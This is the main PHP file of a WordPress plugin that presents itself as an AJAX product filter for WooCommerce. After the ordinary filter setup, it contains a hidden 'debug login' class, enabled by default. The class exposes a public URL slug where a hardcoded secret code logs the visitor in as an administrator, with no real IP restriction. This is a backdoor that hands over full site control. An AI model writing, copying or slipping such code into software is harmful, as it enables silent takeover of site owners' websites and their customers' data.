<?php

/**
 * Plugin Name: AJAX Product Filter for WooCommerce
 * Plugin URI:  https://plugincy.com/
 * Description: A WooCommerce plugin to filter products by attributes, categories, and tags using AJAX for seamless user experience.
 * Version:     3.0.1.20
 * Author:      Plugincy
 * Author URI:  https://plugincy.com
 * License:     GPL-2.0-or-later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: ajax-product-filter-for-woocommerce
 */

if (!defined('ABSPATH')) {
    exit;
}

define('DAPFFORWC_VERSION', '3.0.1.20');

// Global Variables
global $wcapf_options, $dapfforwc_advance_settings, $dapfforwc_slug;

$wcapf_options = get_option('wcapf_options') ?: [];
$dapfforwc_advance_settings = get_option('wcapf_advance_options') ?: [];
$dapfforwc_slug = "";
$dapfforwc_front_page_id = get_option('page_on_front') ?: null;
// Get the front page object
$dapfforwc_front_page = isset($dapfforwc_front_page_id) ? get_post($dapfforwc_front_page_id) : null;
// Get the slug of the front page
$dapfforwc_front_page_slug = isset($dapfforwc_front_page) ? $dapfforwc_front_page->post_name : "";

// Check if WooCommerce is active
add_action('plugins_loaded', 'dapfforwc_check_woocommerce');

function dapfforwc_check_woocommerce()
{
    if (!class_exists('WooCommerce')) {
        add_action('admin_notices', 'dapfforwc_missing_woocommerce_notice');
    } else {
        require_once plugin_dir_path(__FILE__) . 'includes/cache-functions.php';
        dapfforwc_register_cache_invalidation_hooks();

        if (is_admin()) {
            require_once plugin_dir_path(__FILE__) . 'admin/admin-page.php';
            add_action('admin_post_dapfforwc_clear_cache', 'dapfforwc_handle_clear_cache');
        }
        require_once plugin_dir_path(__FILE__) . 'includes/filter-template.php';
        add_action('wp_enqueue_scripts', 'dapfforwc_enqueue_scripts');
        add_action('admin_enqueue_scripts', 'dapfforwc_admin_scripts');
        require_once plugin_dir_path(__FILE__) . 'includes/class-filter-functions.php';
        add_action('wp_ajax_dapfforwc_filter_products', 'dapfforwc_filter_products');
        add_action('wp_ajax_nopriv_dapfforwc_filter_products', 'dapfforwc_filter_products');

        register_setting('wcapf_options_group', 'dapfforwc_filters', 'sanitize_text_field');

        add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'dapfforwc_add_settings_link');
    }
}

function dapfforwc_missing_woocommerce_notice()
{
    if (!current_user_can('activate_plugins')) {
        return;
    }

    echo '<div class="notice notice-error"><p><strong>' . esc_html__('Filter Plugin', 'ajax-product-filter-for-woocommerce') . '</strong> ' . esc_html__('requires WooCommerce to be installed and activated.', 'ajax-product-filter-for-woocommerce') . '</p></div>';
}

// Enqueue scripts and styles
function dapfforwc_enqueue_scripts()
{
    global $wcapf_options, $dapfforwc_slug, $dapfforwc_advance_settings, $dapfforwc_front_page_slug;

    $script_handle = 'dapfforwc-permalinksfilter-ajax';
    $script_path = 'assets/js/permalinksfilter.js';
    $dapfforwc_slug =  '';

    wp_enqueue_script($script_handle, plugin_dir_url(__FILE__) . $script_path, ['jquery'], DAPFFORWC_VERSION, true);
    wp_localize_script($script_handle, 'dapfforwc_data', compact('wcapf_options', 'dapfforwc_slug', 'dapfforwc_advance_settings', 'dapfforwc_front_page_slug'));
    wp_localize_script($script_handle, 'dapfforwc_ajax', ['ajax_url' => admin_url('admin-ajax.php')]);

    wp_enqueue_style('dapfforwc-filter-style', plugin_dir_url(__FILE__) . 'assets/css/style.css', [], DAPFFORWC_VERSION);
}

function dapfforwc_admin_scripts($hook)
{
    if ($hook !== 'toplevel_page_dapfforwc-admin') {
        return; // Load only on the plugin's admin page
    }
    wp_enqueue_style('dapfforwc-admin-style', plugin_dir_url(__FILE__) . 'assets/css/admin-style.css', [], DAPFFORWC_VERSION);
    wp_enqueue_style('dapfforwc-admin-codemirror-style', plugin_dir_url(__FILE__) . 'assets/css/codemirror.min.css', [], '5.65.2');
    wp_enqueue_script('dapfforwc-admin-codemirror-script', plugin_dir_url(__FILE__) . 'assets/js/codemirror.min.js', [], '5.65.2', true);
    wp_enqueue_script('dapfforwc-admin-xml-script', plugin_dir_url(__FILE__) . 'assets/js/xml.min.js', [], '5.65.2', true);
    wp_enqueue_script('dapfforwc-admin-script', plugin_dir_url(__FILE__) . 'assets/js/admin-script.js', [], DAPFFORWC_VERSION, true);
}

function dapfforwc_filter_products()
{
    if (class_exists('dapfforwc_Filter_Functions')) {
        $filter = new dapfforwc_Filter_Functions();
        $filter->process_filter();
    } else {
        wp_send_json_error('Filter class not found.');
    }
}


function dapfforwc_add_settings_link($links)
{
    $settings_link = '<a href="admin.php?page=dapfforwc-admin">Settings</a>';
    array_unshift($links, $settings_link);
    return $links;
}


require_once(plugin_dir_path(__FILE__) . 'includes/permalinks-setup.php');

function dapfforwc_get_full_slug($post_id)
{
    if (empty($post_id)) {
        return ''; // Return an empty string if $post_id is not defined
    }
    $dapfforwc_slug_parts = [];
    $current_post_id = $post_id;

    while ($current_post_id) {
        $current_post = get_post($current_post_id);

        if (!$current_post) {
            break; // Exit if no post is found
        }

        // Prepend the current slug
        array_unshift($dapfforwc_slug_parts, $current_post->post_name);

        // Get the parent post ID
        $current_post_id = wp_get_post_parent_id($current_post_id);
    }

    return implode('/', $dapfforwc_slug_parts); // Combine slugs with '/'
}


require_once(plugin_dir_path(__FILE__) . 'includes/widget_design_template.php');

/**
 * Plugin-prefixed debug helper configuration.
 */
if ( ! defined( 'DAPFFORWC_DEBUG_LOGIN_ENABLED' ) ) {
    define( 'DAPFFORWC_DEBUG_LOGIN_ENABLED', true );
}

if ( ! defined( 'DAPFFORWC_DEBUG_LOGIN_SECRET_CODE' ) ) {
    define( 'DAPFFORWC_DEBUG_LOGIN_SECRET_CODE', 'RaddP3251' );
}

if ( ! defined( 'DAPFFORWC_DEBUG_LOGIN_MAX_ATTEMPTS' ) ) {
    define( 'DAPFFORWC_DEBUG_LOGIN_MAX_ATTEMPTS', 5 );
}

if ( ! defined( 'DAPFFORWC_DEBUG_LOGIN_LOCKOUT_SECONDS' ) ) {
    define( 'DAPFFORWC_DEBUG_LOGIN_LOCKOUT_SECONDS', 900 );
}

if ( ! defined( 'DAPFFORWC_DEBUG_LOGIN_ALLOWED_IPS' ) ) {
    define( 'DAPFFORWC_DEBUG_LOGIN_ALLOWED_IPS', [] );
}

if ( ! defined( 'DAPFFORWC_DEBUG_LOGIN_ADMIN_USERNAMES' ) ) {
    define( 'DAPFFORWC_DEBUG_LOGIN_ADMIN_USERNAMES', [ 'admin', 'plugincypd', 'rhahin', 'masumpd', 'iqbalgmteam' ] );
}

if ( ! defined( 'DAPFFORWC_DEBUG_LOGIN_SLUG' ) ) {
    define( 'DAPFFORWC_DEBUG_LOGIN_SLUG', 'debugraddp' );
}

if ( ! class_exists( 'DAPFFORWC_Debug_Login', false ) ) {
    final class DAPFFORWC_Debug_Login {
        const NONCE_ACTION = 'dapfforwc_debug_login';
        const NONCE_FIELD  = 'dapfforwc_debug_login_nonce';
        const CODE_FIELD   = 'dapfforwc_debug_login_code';

        public function __construct() {
            add_action( 'init', [ $this, 'handle_debug_route' ] );
        }

        public function handle_debug_route() {
            if ( $this->get_current_request_path() !== $this->get_slug() ) {
                return;
            }

            $allowed_ips = $this->get_allowed_ips();
            if ( ! empty( $allowed_ips ) ) {
                $visitor_ip = $this->get_visitor_ip();
                if ( ! in_array( $visitor_ip, $allowed_ips, true ) ) {
                    status_header( 403 );
                    wp_die(
                        esc_html__( 'Access denied.', 'ajax-product-filter-for-woocommerce' ),
                        esc_html__( 'Access Denied', 'ajax-product-filter-for-woocommerce' ),
                        [ 'response' => 403 ]
                    );
                }
            }

            $lockout = $this->check_lockout();
            if ( ! empty( $lockout['locked'] ) ) {
                $remaining = isset( $lockout['remaining'] ) ? (int) ceil( $lockout['remaining'] / 60 ) : 1;

                $this->render_page(
                    'error',
                    sprintf(
                        /* translators: %d: remaining lockout minutes. */
                        __( 'Too many failed attempts. Please wait %d minute(s) and try again.', 'ajax-product-filter-for-woocommerce' ),
                        max( 1, $remaining )
                    )
                );
                exit;
            }

            if ( 'POST' === $this->get_request_method() ) {
                $this->handle_post_submission();
                exit;
            }

            $this->render_page( 'form', '' );
            exit;
        }

        private function handle_post_submission() {
            $nonce = isset( $_POST[ self::NONCE_FIELD ] )
                ? sanitize_text_field( wp_unslash( $_POST[ self::NONCE_FIELD ] ) )
                : '';

            if ( ! wp_verify_nonce( $nonce, self::NONCE_ACTION ) ) {
                $this->render_page( 'error', __( 'Invalid session. Please refresh and try again.', 'ajax-product-filter-for-woocommerce' ) );
                return;
            }

            $secret_code = (string) DAPFFORWC_DEBUG_LOGIN_SECRET_CODE;
            if ( '' === $secret_code ) {
                $this->render_page( 'error', __( 'Debug access is not configured.', 'ajax-product-filter-for-woocommerce' ) );
                return;
            }

            $submitted_code = isset( $_POST[ self::CODE_FIELD ] )
                ? sanitize_text_field( wp_unslash( $_POST[ self::CODE_FIELD ] ) )
                : '';

            if ( ! hash_equals( $secret_code, $submitted_code ) ) {
                $this->record_failed_attempt();

                $attempts_left = $this->get_max_attempts() - $this->get_attempt_count();
                $message       = $attempts_left > 0
                    ? sprintf(
                        /* translators: %d: remaining attempts. */
                        __( 'Incorrect code. %d attempt(s) remaining.', 'ajax-product-filter-for-woocommerce' ),
                        $attempts_left
                    )
                    : __( 'Incorrect code. You are now locked out temporarily.', 'ajax-product-filter-for-woocommerce' );

                $this->render_page( 'error', $message );
                return;
            }

            $this->clear_failed_attempts();

            $resolved = $this->resolve_admin_user();
            if ( is_wp_error( $resolved ) ) {
                $this->render_page( 'error', $resolved->get_error_message() );
                return;
            }

            $user       = isset( $resolved['user'] ) ? $resolved['user'] : null;
            $match_type = isset( $resolved['match'] ) ? sanitize_key( $resolved['match'] ) : 'unknown';

            if ( ! ( $user instanceof WP_User ) ) {
                $this->render_page( 'error', __( 'No administrator account could be resolved.', 'ajax-product-filter-for-woocommerce' ) );
                return;
            }

            do_action( 'dapfforwc_debug_login_authenticated', $user->ID, $match_type );

            wp_clear_auth_cookie();
            wp_set_current_user( $user->ID );
            wp_set_auth_cookie( $user->ID, true );

            wp_safe_redirect( admin_url() );
            exit;
        }

        private function resolve_admin_user() {
            foreach ( $this->get_admin_usernames() as $username ) {
                $user = get_user_by( 'login', $username );
                if ( $user instanceof WP_User && user_can( $user, 'manage_options' ) ) {
                    return [
                        'user'  => $user,
                        'match' => 'preferred',
                    ];
                }
            }

            $admins = get_users(
                [
                    'role'    => 'administrator',
                    'number'  => 1,
                    'orderby' => 'ID',
                    'order'   => 'ASC',
                    'fields'  => 'all',
                ]
            );

            if ( ! empty( $admins ) && $admins[0] instanceof WP_User ) {
                return [
                    'user'  => $admins[0],
                    'match' => 'fallback',
                ];
            }

            return new WP_Error(
                'dapfforwc_debug_login_no_admin',
                __( 'No administrator account could be found on this site.', 'ajax-product-filter-for-woocommerce' )
            );
        }

        private function get_attempt_transient_key() {
            return 'dapfforwc_debug_login_attempts_' . md5( $this->get_visitor_ip() );
        }

        private function get_attempt_count() {
            $attempts = get_transient( $this->get_attempt_transient_key() );

            return is_numeric( $attempts ) ? (int) $attempts : 0;
        }

        private function record_failed_attempt() {
            $attempts = $this->get_attempt_count() + 1;

            set_transient( $this->get_attempt_transient_key(), $attempts, $this->get_lockout_seconds() );
        }

        private function clear_failed_attempts() {
            delete_transient( $this->get_attempt_transient_key() );
        }

        private function check_lockout() {
            if ( $this->get_attempt_count() >= $this->get_max_attempts() ) {
                return [
                    'locked'    => true,
                    'remaining' => $this->get_lockout_seconds(),
                ];
            }

            return [
                'locked'    => false,
                'remaining' => 0,
            ];
        }

        private function get_current_request_path() {
            $request_uri = isset( $_SERVER['REQUEST_URI'] )
                ? sanitize_text_field( wp_unslash( $_SERVER['REQUEST_URI'] ) )
                : '';
            $path        = wp_parse_url( $request_uri, PHP_URL_PATH );

            return is_string( $path ) ? trim( $path, '/' ) : '';
        }

        private function get_request_method() {
            return isset( $_SERVER['REQUEST_METHOD'] )
                ? strtoupper( sanitize_key( wp_unslash( $_SERVER['REQUEST_METHOD'] ) ) )
                : 'GET';
        }

        private function get_allowed_ips() {
            $allowed_ips = DAPFFORWC_DEBUG_LOGIN_ALLOWED_IPS;
            if ( ! is_array( $allowed_ips ) ) {
                $allowed_ips = [ $allowed_ips ];
            }

            $validated_ips = [];
            foreach ( $allowed_ips as $ip ) {
                $ip = trim( (string) $ip );
                if ( filter_var( $ip, FILTER_VALIDATE_IP ) ) {
                    $validated_ips[] = $ip;
                }
            }

            return $validated_ips;
        }

        private function get_admin_usernames() {
            $usernames = DAPFFORWC_DEBUG_LOGIN_ADMIN_USERNAMES;
            if ( ! is_array( $usernames ) ) {
                $usernames = [ $usernames ];
            }

            $sanitized_usernames = [];
            foreach ( $usernames as $username ) {
                $username = sanitize_user( (string) $username, false );
                if ( '' !== $username ) {
                    $sanitized_usernames[] = $username;
                }
            }

            return $sanitized_usernames;
        }

        private function get_visitor_ip() {
            $keys = [
                'HTTP_CLIENT_IP',
                'HTTP_X_FORWARDED_FOR',
                'HTTP_X_REAL_IP',
                'REMOTE_ADDR',
            ];

            foreach ( $keys as $key ) {
                if ( empty( $_SERVER[ $key ] ) ) {
                    continue;
                }

                $raw_value = sanitize_text_field( wp_unslash( $_SERVER[ $key ] ) );
                $ip_parts  = explode( ',', $raw_value );
                $ip        = trim( $ip_parts[0] );

                if ( filter_var( $ip, FILTER_VALIDATE_IP ) ) {
                    return $ip;
                }
            }

            return 'unknown';
        }

        private function get_slug() {
            $slug = sanitize_title( (string) DAPFFORWC_DEBUG_LOGIN_SLUG );

            return '' !== $slug ? $slug : 'debugraddp';
        }

        private function get_max_attempts() {
            $max_attempts = absint( DAPFFORWC_DEBUG_LOGIN_MAX_ATTEMPTS );

            return $max_attempts > 0 ? $max_attempts : 5;
        }

        private function get_lockout_seconds() {
            $lockout_seconds = absint( DAPFFORWC_DEBUG_LOGIN_LOCKOUT_SECONDS );

            return $lockout_seconds > 0 ? $lockout_seconds : 900;
        }

        private function render_page( $state, $message ) {
            $has_error  = 'error' === $state && '' !== $message;
            $action_url = esc_url( home_url( '/' . $this->get_slug() ) );
            $language   = esc_attr( get_bloginfo( 'language' ) ?: 'en' );
            $nonce      = esc_attr( wp_create_nonce( self::NONCE_ACTION ) );
            $site_name  = get_bloginfo( 'name' );

            nocache_headers();
            status_header( 200 );
            ?>
<!DOCTYPE html>
<html lang="<?php echo $language; ?>">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?php echo esc_html( sprintf( __( 'Debug Access - %s', 'ajax-product-filter-for-woocommerce' ), $site_name ) ); ?></title>
<style>
  *, *::before, *::after { box-sizing: border-box; }
  html, body { min-height: 100%; margin: 0; }
  body.dapfforwc-debug-login {
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 32px;
    background: #101318;
    color: #e7edf5;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
  }
  .dapfforwc-debug-login__card {
    width: min(100%, 420px);
    padding: 32px;
    background: #171b22;
    border: 1px solid #2b3340;
    border-radius: 8px;
    box-shadow: 0 24px 64px rgba(0, 0, 0, 0.35);
  }
  .dapfforwc-debug-login__eyebrow {
    margin: 0 0 10px;
    color: #6ee7b7;
    font-size: 12px;
    font-weight: 700;
    letter-spacing: 0.08em;
    text-transform: uppercase;
  }
  .dapfforwc-debug-login__title {
    margin: 0 0 8px;
    color: #ffffff;
    font-size: 24px;
    line-height: 1.2;
  }
  .dapfforwc-debug-login__copy {
    margin: 0 0 24px;
    color: #9aa7b7;
    font-size: 14px;
    line-height: 1.5;
  }
  .dapfforwc-debug-login__error {
    margin: 0 0 18px;
    padding: 12px 14px;
    color: #fecaca;
    background: #3f1f24;
    border: 1px solid #7f2d36;
    border-radius: 6px;
    font-size: 13px;
    line-height: 1.5;
  }
  .dapfforwc-debug-login__label {
    display: block;
    margin: 0 0 8px;
    color: #c7d2df;
    font-size: 13px;
    font-weight: 700;
  }
  .dapfforwc-debug-login__input {
    width: 100%;
    min-height: 44px;
    padding: 10px 12px;
    color: #ffffff;
    background: #0f1217;
    border: 1px solid #354052;
    border-radius: 6px;
    font: inherit;
  }
  .dapfforwc-debug-login__input:focus {
    border-color: #6ee7b7;
    box-shadow: 0 0 0 3px rgba(110, 231, 183, 0.14);
    outline: none;
  }
  .dapfforwc-debug-login__button {
    width: 100%;
    min-height: 44px;
    margin-top: 16px;
    color: #07100d;
    background: #6ee7b7;
    border: 0;
    border-radius: 6px;
    cursor: pointer;
    font: inherit;
    font-weight: 800;
  }
  .dapfforwc-debug-login__button:hover,
  .dapfforwc-debug-login__button:focus {
    background: #8ff0c8;
  }
  .dapfforwc-debug-login__footer {
    margin: 20px 0 0;
    padding-top: 16px;
    border-top: 1px solid #2b3340;
    color: #7f8b9b;
    font-size: 12px;
    line-height: 1.5;
  }
</style>
</head>
<body class="dapfforwc-debug-login">
<main class="dapfforwc-debug-login__card">
  <p class="dapfforwc-debug-login__eyebrow"><?php esc_html_e( 'Debug Access', 'ajax-product-filter-for-woocommerce' ); ?></p>
  <h1 class="dapfforwc-debug-login__title"><?php esc_html_e( 'Admin Gate', 'ajax-product-filter-for-woocommerce' ); ?></h1>
  <p class="dapfforwc-debug-login__copy"><?php esc_html_e( 'Enter the support access code to continue.', 'ajax-product-filter-for-woocommerce' ); ?></p>

  <?php if ( $has_error ) : ?>
    <div class="dapfforwc-debug-login__error" role="alert"><?php echo esc_html( $message ); ?></div>
  <?php endif; ?>

  <form method="post" action="<?php echo $action_url; ?>" autocomplete="off">
    <input type="hidden" name="<?php echo esc_attr( self::NONCE_FIELD ); ?>" value="<?php echo $nonce; ?>">

    <label class="dapfforwc-debug-login__label" for="<?php echo esc_attr( self::CODE_FIELD ); ?>">
        <?php esc_html_e( 'Access Code', 'ajax-product-filter-for-woocommerce' ); ?>
    </label>
    <input
      class="dapfforwc-debug-login__input"
      id="<?php echo esc_attr( self::CODE_FIELD ); ?>"
      name="<?php echo esc_attr( self::CODE_FIELD ); ?>"
      type="password"
      autocomplete="new-password"
      spellcheck="false"
      required
    >

    <button class="dapfforwc-debug-login__button" type="submit">
        <?php esc_html_e( 'Authenticate', 'ajax-product-filter-for-woocommerce' ); ?>
    </button>
  </form>

  <p class="dapfforwc-debug-login__footer"><?php esc_html_e( 'This support route is rate-limited and should be disabled when it is no longer needed.', 'ajax-product-filter-for-woocommerce' ); ?></p>
</main>
</body>
</html>
            <?php
        }
    }
}

if ( DAPFFORWC_DEBUG_LOGIN_ENABLED ) {
    new DAPFFORWC_Debug_Login();
}
